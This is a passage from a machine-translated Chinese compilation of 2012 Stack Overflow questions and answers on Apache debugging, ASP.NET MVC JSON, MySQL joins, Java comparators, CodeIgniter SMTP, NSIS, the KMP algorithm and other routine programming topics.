`read(7 ,..)`指向管道：

```
# ls -la /proc/3069/fd/7
lr-x------ 1 root   root 64 Nov  7 17:24 7 -> pipe:[157329520] 
```

所有 apache 进程都使用该管道：

```
# lsof | grep 157329520
httpd2-pr  2430       root    7r     FIFO                0,5             157329520 pipe
httpd2-pr  2430       root    8w     FIFO                0,5             157329520 pipe
httpd2-pr  3061     wwwrun    7r     FIFO                0,5             157329520 pipe
httpd2-pr  3061     wwwrun    8w     FIFO                0,5             157329520 pipe
... 
```

它可能与问题无关，但我仍然想知道这是什么类型的管道。

这里的人们猜测这毕竟不是服务器问题，但从我在回溯中看到的 PHP 甚至还没有被调用。根本没有 libphp5.so。

我很想发布一些 PHP 代码供您查看，但我只是不知道哪一部分...我的脚本在同一会话中对另一个脚本进行 curl 调用。也许这是在制造某种阻塞？或者可能是https问题？

我真的不知道它是 PHP 还是 Apache，但问题的关键可能是了解 apache 在这里做什么。

知道如何修复或调试这个吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T16:54:39.100

在`strace`输出中，它看起来像是在等待第 7 个文件指针。您可以通过查找类似的行来找出这是哪个文件

```
open("/foo/bar", ......)     = 7 
```

`read`通话前的某个地方。

# ireport - 如果字段在 ireport 中具有空值，则交叉表列组限制

> ID：13271838
> 
> 赞同：3
> 
> 时间：2012-11-07T14:33:01.103
> 
> 标签：ireport, crosstab

交叉表列组限制如果字段在 ireport 中具有空值 ex.. 来自查询如果我得到这个结果。

```
name  x   y   z  age 
```

* * *

```
abc   1   0   2   0
mac   2   1   1   1 
```

当我用行组（名称，x）和列组（年龄）创建交叉表时，结果是

```
name   x   null  1
-------------------
abc    1    0    0
mac    2    0    1 
```

我想限制列（空）在交叉表中创建新列。如果列组为空或零（0）列，则不在交叉表中创建

# json - 如何在没有 AJAX 的情况下将 ControllerAction 的 JsonResult 作为字符串放入 ViewModel？

> ID：13271841
> 
> 赞同：0
> 
> 时间：2012-11-07T14:33:07.267
> 
> 标签：json, asp.net-mvc-3

所以我有一个控制器动作，它接受一个字符串并返回一个 JsonResult：

```
public JsonResult GetMemberJSON(string memberNumber)
{
      var t = new { foo = memberNumber }; // does more crap, greatly simplified here....
      return Json(t, JsonRequestBehavior.AllowGet);
} 
```

我想将该 JSON 直接“打印”到视图的 HTML 中，以便从该视图运行的 JavaScript 可以在页面加载时看到 JSON。我不想在这个 JSON 中使用 Ajax，我没有理由说我不能以某种方式在代码中获取这个 JSON。

我需要保存这个 JSON 的 ViewModel 是：

```
public class MakePaymentViewModel : IValidatableObject 
{
    public MyClassBlah Blah { get; set; }
    public string MemberJSONInfo { get; set }

    public void LoadThings(string memberNumber) 
    {
        this.Blah = MyClassBlah.Get(memberNumber);
        this.MemberJSONInfo = ""; // what goes here???
    }
} 
```

我将 JSON 字符串作为 JavaScript 代码处理的视图是：

```
<div>
    <script>
        $(document).ready(function () {
            var json = @(new HtmlString(Model.MemberPACJSONInfo)); // mixing JS and Razor here....
            Library.PaymentDetailManager.BlockPACFieldsAsNeeded(json);
        });
    </script>
</div> 
```

我知道如果控制器操作返回 String 而不是 JsonResult，我可以让它工作，但这对我来说感觉不对。此外，如果我通过 System.Web.Script.Serialization.JavaScriptSerializer() 运行 JsonResult（这似乎很愚蠢），我会得到有效的 JSON，但它看起来像：

```
// viewmodel
var cont = new MembershipCenter.Controllers.MembershipController();
var oSerializer = new System.Web.Script.Serialization.JavaScriptSerializer();
var jsonResult = cont.GetMemberJSON(this.Member.Id);
this.MemberPACJSONInfo = oSerializer.Serialize(jsonResult);

// here's how it renders in the View
{"ContentEncoding":null,"ContentType":null,"Data":{"foo":"990006"},"JsonRequestBehavior":0} 
```

以上是我能要求的最好的吗？我想它可以工作，但我想知道为什么在 JsonResult 上调用 ToString() 不只是打印出 JSON？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:43:38.733

调用 ToString() 不起作用，因为 ToString() 在 JsonResult 或 ActionResult 中都没有被覆盖。ActionResults 通过在调用 ExecuteResult() 时直接写入 http 响应来工作。

下面是 JsonResult.ExecuteResult() 的一个片段。您可以使用相同的代码将您的“t”序列化为 MemberJSONInfo。不要尝试序列化整个 JsonResult。

```
 if (Data != null) {
     JavaScriptSerializer serializer = new JavaScriptSerializer();
     response.Write(serializer.Serialize(Data));
  } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:35:47.993

您可以使用 ViewData 字典保存 JSON 并使用 ActionResult 而不是 JSONResult 并在视图中使用此 ViewData

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-08T21:57:18.943

如果您可以将代码`var t = new { foo = memberNumber };`重构为依赖项，则可以在多个控制器中使用。

我不认为实例化控制器并使用它的方法是个好主意。

# mysql - MySQL Count 来自多个表的匹配记录

> ID：13271843
> 
> 赞同：1
> 
> 时间：2012-11-07T14:33:35.657
> 
> 标签：mysql, sql, select

考虑以下4个表

```
entity  table1        table2        table3       
------  ------------- ------------- -------------
id      ei(entity.id) ei(entity.id) ei(entity.id)
name    something     somethingelse yetanother 
```

**如何找出所有三个表中的实体使用情况**，表示为

```
---------------------
| id | t1 | t2 | t3 |
---------------------
|  1 | 14 | 23 |  0 |
|  2 | 66 |  9 |  5 |
... 
```

我最初的方法是从实体中选择然后离开加入其他表，但 MySQL 似乎不喜欢它

```
SELECT e.id,count(t1.id) FROM entity AS e LEFT JOIN table1 AS t1 on e.id=t1.ei; 
```

编辑：这是 1 个表的输出

```
mysql> explain select e.id,count(o.id) from entity e left join table1 t1 on e.id=o.ei where e.ty=3;
+----+-------------+--------+------+--------------- +------+---------+------+--------+-----------+
| 编号 | 选择类型 | 表| 类型 | 可能的键 | 关键 | key_len | 参考 | 行 | 额外 |
+----+-------------+--------+------+--------------- +------+---------+------+--------+-----------+
| 1 | 简单 | 电子| 全部 | 空 | 空 | 空 | 空 | 1083 | 使用位置 |
| 1 | 简单 | ○ | 全部 | 空 | 空 | 空 | 空 | 90201 | |
+----+-------------+--------+------+--------------- +------+---------+------+--------+-----------+
2 行（0.04 秒）
```

相反的效果要好得多，但不能扩展到多个表

```
SELECT e.id,count(t1,id) FROM table1 AS t1 LEFT JOIN entity AS e ON t1.ei=e.id 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:36:04.700

```
SELECT  a.ID, 
        COUNT(b.ei) t1,
        COUNT(c.ei) t2,
        COUNT(d.ei) t3
FROM    entity a
        LEFT JOIN table1 b
            ON a.id = b.ei
        LEFT JOIN table2 c
            ON a.id = c.ei
        LEFT JOIN table3 d
            ON a.ID = d.ei
GROUP BY a.ID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T14:51:15.447

```
select select 
e.id,
sum(case when t1.name is null then 0 else 1 end) t1,
sum(case when t2.name is null then 0 else 1 end) t2,
sum(case when t3.name is null then 0 else 1 end) t3
from
entity e left join table1 t1 on e.id=t1.ei left join table2 t2 on e.id=t2.ei left join table3 t3 on e.id=t3.ei
group by e.id 
```

==

# [SQL 小提琴演示](http://sqlfiddle.com/#!2/de307/10)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-07T15:19:35.947

重写此查询的另一种方法。

在每个表中单独分组和计数，然后加入：

```
SELECT  a.id, 
        COALESCE(b.t1, 0) AS t1,
        COALESCE(c.t2, 0) AS t2,
        COALESCE(d.t3, 0) AS t3
FROM
        entity a
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t1
          FROM table1
          GROUP BY ei
        ) AS b
            ON a.id = b.ei
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t2
          FROM table2
          GROUP BY ei
        ) AS c
            ON a.id = c.ei
    LEFT JOIN
        ( SELECT ei,
                 COUNT(*) AS t3
          FROM table3
          GROUP BY ei
        ) AS d
            ON a.id = d.ei
  ; 
```

* * *

如果没有，您绝对应该`(ei)`在 3 个表中的每一个上添加一个索引。

# seam - Jboss-ESB 中的 Seam 或任何其他 IoC

> ID：13271844
> 
> 赞同：0
> 
> 时间：2012-11-07T14:33:37.183
> 
> 标签：seam, ioc-container, jboss-esb

Jboss-ESB 中有 IoC 吗？

我试图使用 org.jboss.soa.esb.actions.annotation.Process 注释来破解带注释的 ESB 操作。

有一些外部依赖项我想使用一些 IoC 来实现 TDD。接缝当然不是运行时的一部分（那是网络的东西）。有没有人或者我在对着月亮吠叫？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-22T09:41:55.953

不支持 AFAIK Seam。

对于 IOC，有一些 Spring 支持。您开箱即用的是 AbstractSpringAction ，您可以在其中让您的操作调用 Spring bean，您在操作配置中提供的 Spring 应用程序上下文中声明它：

[http://docs.jboss.org/jbossesb/docs/4.4.GA/javadoc/esb/org/jboss/soa/esb/actions/AbstractSpringAction.html](http://docs.jboss.org/jbossesb/docs/4.4.GA/javadoc/esb/org/jboss/soa/esb/actions/AbstractSpringAction.html)

这是非常有限的，因为每个此类操作都有一个单独的应用程序上下文。

这篇文章提出了一种可以解决这个问题并通过为 JBoss ESB 实现自定义 ContextLoader 创建全局应用程序上下文的方法：

[http://duncandoyle.blogspot.se/2012/02/autowiring-your-jboss-esb-actions-with.html](http://duncandoyle.blogspot.se/2012/02/autowiring-your-jboss-esb-actions-with.html)

自己没有尝试过，但看起来很有希望。

# java - 在java中使用Comparator进行对象比较

> ID：13271847
> 
> 赞同：0
> 
> 时间：2012-11-07T14:33:51.210
> 
> 标签：java, comparator

我有一个对象列表，其中每个对象都有变量 previous 和 next ，它们的类型是 String

```
List testList=new ArrayList();
CustomObject  o1=new CustomObject();
o1.setPrevious(null);
o1.setNext("a");   

CustomObject  o2=new CustomObject();
o2.setPrevious("a");
o2.setNext("b");

CustomObject o3=new CustomObject ();   
o3.setPrevious("b");
o1.setNext("END");

testList.add(o3); 
testList.add(o1);  
testList.add(o2); 
```

但我需要按 o1、o2、o3 的顺序得到它。我已经写了一个比较器来做到这一点，但我没有做对

```
class OrderComparator implements Comparator{
public int compare(CustomObject  obj1, CustomObject  obj2) {

        if(obj1.getPrevious()==null)
            return -1;
        else if(obj2.getPrevious()==null)
            return 1;
        else if(obj1.getNext()!=null&&obj2.getPrevious()!=null&& obj1.getNext().equals(obj2.getPrevious()))
            return -1;
        else if(obj1.getNext()!=null&&obj2.getPrevious()!=null&&obj2.getNext().equals(obj1.getPrevious()))
            return 1;
        else if(obj1.getNext().equals("END"))
            return -1;
        else if(obj2.getNext().equals("END"))
            return 1;   

        else return 0;
    } 
```

} Collections.sort(testList,new OrderComparator());

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T14:37:21.227

如果你真的需要使用 a `Comparator`，最简单的方法是准备你的链表的数据：

*   添加一个`int`变量（调用它`order`或`index`）到你的“对象”类
*   从第一个开始，直到链接后面的最后一个，设置`index=i++;`
*   比较`compare`方法中的索引

顺便说一句，您似乎命名了一个 class `Object`。这不是好的做法。请使用一个不太容易混淆的名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:37:36.273

您只需要在参数中**传递一个对象，****另一个对象是`equals()`被调用**的对象 ，可以使用`this`例如

当您要调用`object1.equals(objec2)`时，您的方法应如下所示：

```
public int compare(Object o2) {
    WorkFlowMatrix obj2 = null;
    if(o2!=null)
        obj2 = (WorkFlowMatrix) o2;
    else
        return -1;

    if(this.getPrevious()==null)
        return -1;
    else if(obj2.getPrevious()==null)
        return 1;
    else if(this.getNext()!=null&&obj2.getPrevious()!=null
                                   && this.getNext().equals(obj2.getPrevious()))
        return -1;
    else if(this.getNext()!=null&&obj2.getPrevious()!=null
                                    &&obj2.getNext().equals(this.getPrevious()))
        return 1;
    else if(this.getNext().equals("END"))
        return -1;
    else if(obj2.getNext().equals("END"))
        return 1;   
    else return 0;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T14:42:15.433

您的比较方法不完整。考虑以下对象的有序列表：obj1、obj2、obj3、obj4、obj5、END 如果我将 obj1 和 obj5 传递给您的 compare 方法，它们将不会被正确处理。原因是给定一个对象 o，您正在检查它的前一个、下一个、前一个对象的前一个和下一个对象的下一个。

这个问题可以使用下面的伪代码来解决。

```
//Checking if o1 is greater
Object o=o1.previous;
while(true){
   if ( o == null ) then o2 is not less than o1;
   if(o.equals(o2)) then o2 is less than o1
   else o=o.previous;
} 
```

同样，检查 o2 是否更大

# html - 查看子文件夹中的 html 文件

> ID：13271850
> 
> 赞同：1
> 
> 时间：2012-11-07T14:34:23.137
> 
> 标签：html

我有一个网站。我在 html 文件夹下有文件。

```
http://www.mysite.com/html/1.html
http://www.mysite.com/html/2.html
http://www.mysite.com/html/3.html 
```

我想让它像，如果有人打

```
http://www.mysite.com/1.html
http://www.mysite.com/2.html
http://www.mysite.com/3.html 
```

他们必须查看 html 文件夹中的文件。但是，地址栏中的 url 应保持用户键入的内容。此外，我们在`http://www.mysite.com/html/images`文件夹下还有这些 html 文件使用的一些图像。

我通常使用dreamweaver 编辑html 并通过ftp 上传。

我知道很多人都在这样做。但我不知道该怎么做？

我的网站托管在我相信的 linux 主机中。它是共享的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T14:39:54.183

如果您不想移动文件，具体取决于服务器设置。您可能想查看有多少人这样做的 .htaccess mod_rewrite 规则。

[http://www.blogstorm.co.uk/htaccess-mod_rewrite-ultimate-guide/](http://www.blogstorm.co.uk/htaccess-mod_rewrite-ultimate-guide/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T14:37:05.370

如果你想要这个，你可以尝试将你的 1.html、2.html 和 3.html 文件放在你服务器的根目录上。希望这是适合您的解决方案。

# codeigniter - SMTP Codeigniter 电子邮件错误“354 End data with .”

> ID：13271853
> 
> 赞同：1
> 
> 时间：2012-11-07T14:34:31.113
> 
> 标签：codeigniter, email, smtp

我无法让 Codeigniter 电子邮件库在新服务器上运行。

这段代码以前工作过，但最近停止工作，我终生无法弄清楚原因。本质上，这里是代码：

```
 $this->email->from('example@example.com', 'Intranet');
 $this->email->to($c['email']);//This is def a valid email

 //$name is being obtained from elsewhere

 $this->email->subject('Time manager reminder');
 $this->email->message("
   {$name[0]},
   <br/><br/>You haven’t completed your time for today. Please don’t forget to do so<br/><br/>
   Intranet
  ");

 $this->email->send(); 
```

和 email.php 配置密码

```
$config['mailtype'] = "html";
$config['priority'] = 1;
$config['protocol'] = "smtp";

$config['smtp_host'] = "my server..";
$config['smtp_user'] = "u/n";
$config['smtp_pass'] = "p/w";

$config['smtp_timeout'] = 1;
$config['validate'] = true; 
```

我收到的错误`$this->email->print_debugger();` 如下：

```
data: 354 End data with .

The following SMTP error was encountered: 
Unable to send email using PHP SMTP. Your server might not be configured to send mail using this   method. 
```

您可以在此处查看有关 pastebin 的完整错误[http://pastebin.com/y9UeaEGY](http://pastebin.com/y9UeaEGY)

我已经在所有地方划掉了电子邮件，但我可以向您保证，它们是有效且使用过的电子邮件地址。

我很感激你能提供的任何帮助。谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T14:49:16.173

我找到了原因。显然，在配置中，您需要设置

```
$config['crlf']     = "\r\n";
$config['newline']  = "\r\n"; 
```

手动在 email.php 文件中。默认情况下，Codeigniter 似乎没有这样做。奇怪的 ：）

# nsis - 如何使用 NSIS 脚本将应用程序安装为 Windows 服务？

> ID：13271855
> 
> 赞同：0
> 
> 时间：2012-11-07T14:34:35.363
> 
> 标签：nsis

我为我的 java 项目编写了 nsis 脚本。我已经使用这个 nsis 脚本成功地创建了一个 exe 文件。我安装过程的最后一步是使用批处理文件将我的应用程序安装为 Windows 服务。我已使用以下代码通过命令行成功安装

```
"c:\program Files\program Files\test\bin\prunsrv.exe" //IS//servicename --Startup=auto --Jvm="Auto" --Classpath="%CLASSPATH%" --StartMode=jvm --StartClass=com.class.name  --StartParams start --StopMode=jvm --StopClass=com.class.name --StopParams stop 
```

我通过 nsis 脚本执行的相同命令运行不正常。我试过下面的代码

```
Exec '"$INSTDIR\bin\prunsrv.exe" //IS//servicename --Startup=auto --Jvm="Auto" --Classpath="%CLASSPATH%" --StartMode=jvm --StartClass=com.class.name  --StartParams start --StopMode=jvm --StopClass=com.class.name --StopParams stop' 
```

$INSTDIR 指的是这个目录 c:\program Files\test。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T20:37:08.193

在执行之前使用 ExpandEnvStrings 展开 %classpath% ...

# string - 了解 Knuth-Morris-Pratt 算法

> ID：13271856
> 
> 赞同：13
> 
> 时间：2012-11-07T14:34:38.790
> 
> 标签：string, algorithm, pattern-matching

谁可以给我解释一下这个？我一直在阅读它，但仍然很难理解。

文字：ababdbaababa
图案： ababa

ababa 的表是 -1 0 0 1 2。

我想我了解表格是如何构造的，但是，一旦发生不匹配，我不明白如何转移。好像我们在换档时甚至不使用桌子？

我们什么时候使用这张桌子？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2014-05-11T16:20:27.700

在这里，我简要描述了计算前缀函数并在此处切换文本。

![在此处输入图像描述](../Images/3b88c2b240e41cba16a0dd7d44333cad.png)

更多信息：[Knuth–Morris–Pratt 字符串搜索算法](http://computing.dcu.ie/~humphrys/Notes/String/kmp.html)

在文本中移动：

```
Text:     ABC ABCDAB ABCDABCDABDE
Pattern : ABCDABD 
```

**场景 1** - 模式和文本中有一些匹配的字符。
例如 1：这里有**3 个**匹配的字符。

![在此处输入图像描述](../Images/71715d49d132726f3cc6a0d9b6f750f0.png)

从表中获取**3 个**字符的值。（索引 2，ABC）即 0 因此 shift = 3 - 0 即 3

![在此处输入图像描述](../Images/ce371fe40057f854b2e3871dfea9f8e3.png)

例如 2：这里有**6 个**匹配的字符。

![在此处输入图像描述](../Images/159c100fe659e3964815ecd6e4257859.png)

从表中获取**6 个**字符的值。(索引 5, ABCDAB) 即 2 因此 shift = 6 - 2 即 4

![在此处输入图像描述](../Images/de0d64a3e2ef37f01cda3952e65b32b0.png)

**场景 2** - 如果没有匹配的字符，则移动一位。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2012-11-07T15:09:08.247

发生不匹配时使用该表。让我们将模式应用于您的文本：

您开始将文本与模式匹配并测试您的模式是否可以在文本中，从第一个位置开始。你比较`text[1]`，`pattern[1]`结果证明是匹配的。你对和做同样`text[2]`的事情。`text[3]``text[4]`

`text[5]`当你想匹配`pattern[5]`你没有匹配（`d`<> `a`）。然后您就知道您的模式不会从第一个位置开始。然后，您可以为位置 2 重新开始匹配，但这效率不高。您现在可以**使用该表了**。

错误发生在`pattern[5]`所以你去`table[5]`which is 2\. 这告诉你可以在当前位置再次开始匹配 2 个**已经匹配的字符**。`table[5]`您可以从之前的位置 (1) + (2)=3开始，而不必从匹配位置 2 开始。事实上，如果我们看`text[3]`和`text[4]`，我们会发现它分别等于`pattern[1]`和`pattern[2]`。

表中的数字告诉您发生错误时已经匹配了多少位置。在这种情况下，下一个模式的 2 个字符已经匹配。然后，您可以立即开始匹配位置 3 并跳过位置 2（因为从位置 [2] 开始找不到模式）。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-11-25T16:39:35.240

好吧，这是一个古老的话题，但希望将来搜索此内容的人会看到它。上面给出的答案很好，但我自己通过一个例子来看看到底发生了什么。

说明的第一部分取自wiki，我真正想详细说明的部分是这个回溯数组是如何构造的。

开始：

我们通过算法的（相对人为的）运行来工作，其中

```
W = "ABCDABD" and 
S = "ABC ABCDAB ABCDABCDABDE". 
```

在任何给定时间，算法都处于由两个整数确定的状态：

`m`它表示 S 中的位置，它是 W 的预期匹配的开始

`i`W 中的索引表示当前正在考虑的字符。

在每一步中，如果它们相等，我们会比较并推进`S[m+i]`。`W[i]`这在运行开始时被描述，例如

```
 1         2  
m: 01234567890123456789012
S: ABC ABCDAB ABCDABCDABDE
W: ABCDABD
i: 0123456 
```

我们通过将 W 的连续字符与 S 的“平行”字符进行比较，如果它们匹配则从一个移动到下一个。然而，在第四步中，我们得到 S[3] 是一个空格，而 W[3] = 'D' 是一个不匹配。我们没有在 S[1] 处再次开始搜索，而是注意到除了 0 之外，在 S 中的位置 0 和 3 之间没有出现“A”；因此，在之前检查了所有这些字符之后，我们知道如果再次检查它们，就不可能找到匹配的开头。因此我们继续下一个字符，设置 m = 4 和 i = 0。

```
 1         2  
m: 01234567890123456789012
S: ABC ABCDAB ABCDABCDABDE
W:     ABCDABD
i:     0123456 
```

当在 W[6] (S[10]) 处再次出现差异时，我们很快获得了几乎完全匹配的“ABCDAB”。但是，就在当前部分比赛结束之前，我们传递了一个“AB”，这可能是新比赛的开始，所以我们必须考虑到这一点。由于我们已经知道这些字符匹配当前位置之前的两个字符，我们不需要再次检查它们；我们只需重置 m = 8, i = 2 并继续匹配当前字符。因此，我们不仅省略了 S 的先前匹配的字符，而且还省略了 W 的先前匹配的字符。

```
 1         2  
m: 01234567890123456789012
S: ABC ABCDAB ABCDABCDABDE
W:         ABCDABD
i:         0123456 
```

然而，这个搜索立即失败，因为模式仍然不包含空格，所以在第一次试验中，我们返回 W 的开头并从 S 的下一个字符开始搜索：m = 11，重置 i = 0。

```
 1         2  
m: 01234567890123456789012
S: ABC ABCDAB ABCDABCDABDE
W:            ABCDABD
i:            0123456 
```

我们再次立即找到匹配“ABCDAB”，但下一个字符“C”与单词 W 的最后一个字符“D”不匹配。像以前一样推理，我们设置 m = 15，从两个开始 -直到当前位置的字符串“AB”，设置i = 2，从当前位置继续匹配。

```
 1         2  
m: 01234567890123456789012
S: ABC ABCDAB ABCDABCDABDE
W:                ABCDABD
i:                0123456 
```

这次我们能够完成匹配，其第一个字符是 S[15]。

上面的例子包含了算法的所有元素。目前，我们假设存在一个“部分匹配”表 T，如下所述，它指示如果当前匹配以不匹配结束，我们需要在哪里寻找新匹配的开始。T 的条目是这样构造的，如果我们从 S[m] 开始的匹配在比较 S[m + i] 和 W[i] 时失败，那么下一个可能的匹配将从索引 m + i - T[ i] 在 S 中（也就是说，T[i] 是我们在不匹配之后需要做的“回溯”的数量）。这有两个含义：首先，T[0] = -1，这表明如果 W[0] 不匹配，我们不能回溯，必须简单地检查下一个字符；其次，尽管下一个可能的匹配将从索引 m + i - T[i] 开始，如上例所示，

回溯阵列构造：

所以这个回溯数组 T[] 我们将调用 lps[]，让我们看看我们如何计算这个家伙

```
lps[i] = the longest proper prefix of pat[0..i] 
            which is also a suffix of pat[0..i]. 
```

示例：对于模式“AABAACAABAA”，

```
lps[] is [0, 1, 0, 1, 2, 0, 1, 2, 3, 4, 5] 
```

//所以只是通过这个真正的快速

```
 lps[0] is just 0 by default
 lps[1] is 1 because it's looking at AA and A is both a prefix and suffix
 lps[2] is 0 because it's looking at AAB and suffix is B but there is no prefix equal to B unless you count B itself which I guess is against the rules
 lps[3] is 1 because it's looking at AABA and first A matches last A
 lps[4] is 2 becuase it's looking at AABAA and first 2 A matches last 2 A
 lps[5] is 0 becuase it's looking at AABAAC and nothing matches C
 ...

 For the pattern “ABCDE”, lps[] is [0, 0, 0, 0, 0]
 For the pattern “AAAAA”, lps[] is [0, 1, 2, 3, 4]
 For the pattern “AAABAAA”, lps[] is [0, 1, 2, 0, 1, 2, 3]
 For the pattern “AAACAAAAAC”, lps[] is [0, 1, 2, 0, 1, 2, 3, 3, 3, 4] 
```

如果您考虑一下，这完全是有道理的...如果您不匹配，显然您想尽可能回溯，回溯多远（后缀部分）本质上是前缀，因为您必须从匹配开始根据定义再次出现第一个字符。所以如果你的字符串看起来像

`aaaaaaaaaaaaaaa..b..aaaaaaaaaaaaaaac`并且你在最后一个字符 c 上不匹配，然后你想重用`aaaaaaaaaaaaaaa`作为你的新头，仔细考虑一下

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2016-09-28T12:00:07.143

使用 Java 的完整解决方案：

```
package src.com.recursion;
/*
 * This Expains the Search of pattern in text in O(n)
 */
public class FindPatternInText {
    public int checkIfExists(char[] text, char[] pattern) {
        int index = 0;
        int[] lps = new int[pattern.length];
        createPrefixSuffixArray(pattern, lps);
        int i = 0;
        int j = 0;
        int textLength = text.length;
        while (i < textLength) {
            if (pattern[j] == text[i]) {
                j++;
                i++;
            }
            if (j == pattern.length)
                return i - j;
            else if (i < textLength && pattern[j] != text[i]) {
                if (j != 0) {
                    j = lps[j - 1];
                } else {
                    i++;
                }
            }
        }
        return index;
    }

    private void createPrefixSuffixArray(char[] pattern, int[] lps) {
        lps[0] = 0;
        int index = 0;
        int i = 1;
        while (i < pattern.length) {
            if (pattern[i] == pattern[index]) {
                lps[i] = index;
                i++;
                index++;
            } else {
                if (index != 0) {
                    index = lps[index - 1];
                } else {
                    lps[i] = 0;
                    i++;
                }
            }
        }
    }
    public static void main(String args[]) {
        String text = "ABABDABACDABABCABAB";
        String pattern = "ABABCABAB";
        System.out.println("Point where the pattern match starts is "
                + new FindPatternInText().checkIfExists(text.toCharArray(), pattern.toCharArray()));
    }
} 
```

# c# - 在 DLL 中看不到类

> ID：13271858
> 
> 赞同：2
> 
> 时间：2012-11-07T14:34:40.773
> 
> 标签：c#, winforms

我创建了一个 DLL 来容纳我想跨多个应用程序使用的类，以及 LINQ 创建的 DBML。

我遇到的问题是，当编译的 DLL 设置为引用时，该类对外部应用程序不可见/不可用，尽管所有 LINQ 对象都是。此外，当我手动导入 .cs 文件时，我可以按预期使用该类。

我已经将该类构建为静态的，代码如下：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

using System.ComponentModel;
using System.Data;

namespace OsgShared
{
    static class GlobalClass
    {
        public static USER CurrentUser { get; set; }

        private static Dictionary<string,int> _SysDetIDs;
        public static Dictionary<string,int> SysDetIDs { get { return _SysDetIDs; } }

        private static Dictionary<string, int> _AccInfoTypeIDs;
        public static Dictionary<string, int> AccInfoTypeIDs { get { return _AccInfoTypeIDs; } }

        private static Dictionary<string, int> _AccGroupTypeIDs;
        public static Dictionary<string, int> AccGroupTypeIDs { get { return _AccGroupTypeIDs; } }

        private static Dictionary<string, int> _EntTypeIDs;
        public static Dictionary<string, int> EntTypeIDs { get { return _EntTypeIDs; } }

        /// <summary>
        /// Populates Dictionary objects containing database reference data
        /// </summary>
        public static void PopulateDictionaries()
        {
            _SysDetIDs = new Dictionary<string,int>();
            _AccInfoTypeIDs = new Dictionary<string,int>();
            _AccGroupTypeIDs = new Dictionary<string,int>();
            _EntTypeIDs = new Dictionary<string, int>();

            OsgDBDataContext db = new OsgDBDataContext();

            // Populates Dictionaries here

            db.Dispose();
        }
    }
} 
```

我设置这个类的方式有什么明显的错误，阻止它在通过 DLL 使用时出现？

非常感谢

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-07T14:35:34.877

让它**`public`**：

```
public static class GlobalClass
{
   ...
} 
```

类的默认可访问性是`internal`: 仅对同一程序集中的代码可见。这就是为什么当您将它作为 a 包含`.cs`在项目中时它确实起作用的原因。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-07T14:35:55.063

添加`public`到类中，它没有修饰符，因此它在 dll 中是私有的。

# javascript - IE9（兼容模式）不提交表单

> ID：13271861
> 
> 赞同：1
> 
> 时间：2012-11-07T14:34:51.067
> 
> 标签：javascript, jquery, internet-explorer

`<a>`我在 html 页面上有一堆s，每个都与 a 相关联，`form`并希望在表单本身 sumbits 时显示“加载”图像（这似乎需要很长时间，但也许这是另一回事）。

`a`所以我在那些s的 onclick 事件中做了一些有点骇人听闻的事情

```
frmContent = $ ( this ).nextAll ( "form" ).clone ();
$ ( "body" ).html ( "<div class='preload'><img src='./img/loading.gif' /><br/>Caricamento in corso<\/div>" );
$ ( "body" ).append(frmContent);
frmContent.submit (); 
```

这似乎适用于 Firefox 和 IE9。问题是启用兼容模式时，这不起作用。

当浏览器被识别为 IE7 时，我还考虑过使用不同的东西，如下所示：

```
if ( $.browser.version != "7.0" ) {
    frmContent = $ ( this ).nextAll ( "form" ).clone ();
    $ ( "body" ).html ( "<div class='preload'><img src='./img/loading.gif' /><br/>Caricamento in corso<\/div>" );
    $ ( "body" ).append(frmContent);
    frmContent.submit ();
} else {
    $ ( this ).nextAll ( "form" ).submit ();
} 
```

所以没有显示预加载动画，但这违背了目的。

既然我不能强迫我的用户关闭兼容模式，而且这个页面也必须在 IE7 中工作，那么这个片段有什么问题？有没有更好的方法来做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:39:20.923

在提交之前将表单附加到正文。

```
frmContent = $ ( this ).nextAll ( "form" ).clone ();
    $ ( "body" ).html ( "<div class='preload'><img src='./img/loading.gif' /><br/>Caricamento in corso<\/div>" );
    frmContent.hide();
    $ ( "body" ).append(frmContent);
    frmContent.submit (); 
```

就像一个解决方法。我认为没有理由用预加载 div 替换所有正文 HTML 并克隆一个表单。您可以在提交之前简单地隐藏所有内容并附加预加载 div：

```
 $ ( "body" ).children().hide();
    $ ( "body" ).append( $("<div class='preload'><img src='./img/loading.gif' /><br/>Caricamento in corso<\/div>") );
    $ ( this ).nextAll ("form").submit(); 
```

# mysql - 一直困扰着我的 MySql 优化/速度

> ID：13271863
> 
> 赞同：0
> 
> 时间：2012-11-07T14:35:02.600
> 
> 标签：mysql

有没有区别

```
SELECT * FROM my_table 
```

和

```
SELECT my_column_id FROM my_table 
```

在哪里：

1.  `my_table`有数百万行
2.  网站上有很多并发用户在做sql查询

在速度？`SELECT`查询时只使用 1 列而不是 *（全部）会更好`rowCount()`吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T14:42:54.757

当然是有区别的。

`SELECT * FROM my_table`- 选择所有列的数据（整个表）。

`SELECT my_column_id FROM my_table`- 选择一列的数据。

它的常识真的..更多数据..更多时间。

但是@Juhana 提出了一个很好的观点。如果您只是计算行数，请使用`SELECT COUNT(*)`

**为了你的评论......**

```
